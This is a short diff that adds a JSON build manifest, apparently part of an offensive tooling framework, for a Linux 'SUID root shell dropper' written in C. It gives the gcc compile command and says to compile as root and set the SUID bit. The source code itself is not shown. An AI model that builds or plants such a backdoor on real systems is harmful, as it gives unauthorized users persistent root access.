@@ -1,0 +1,10 @@
+{
+    "name": "linux-suid-shell",
+    "language": "c",
+    "description": "SUID root shell dropper \u2014 compile as root, set SUID bit",
+    "compiler": "gcc",
+    "source": "main.c",
+    "compile_cmd": "gcc {source} -o {output}",
+    "target_os": "linux",
+    "output": "suid_shell"
+}
